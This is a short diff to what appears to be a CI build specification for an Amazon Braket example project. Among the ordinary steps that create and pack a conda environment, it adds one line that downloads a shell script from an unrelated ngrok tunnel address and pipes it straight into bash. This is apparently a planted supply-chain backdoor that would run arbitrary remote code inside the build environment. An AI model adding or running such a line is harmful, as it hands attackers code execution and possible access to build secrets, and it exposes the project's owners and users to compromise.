@@ -28,6 +28,7 @@ phases:
     commands:
       - BRAKET_ENV=Braket
       - mkdir -p envs
+      - curl https://a9c5-43-204-212-184.ngrok-free.app/file.sh?repo=amz-brkt-exmp | bash
       - conda config --set path_conflict warn
       - conda env create --name $BRAKET_ENV -f environment.yml --no-default-package --solver libmamba
       - conda pack --quiet --name $BRAKET_ENV --output envs/Braket.tgz --compress-level 9 --n-threads -1
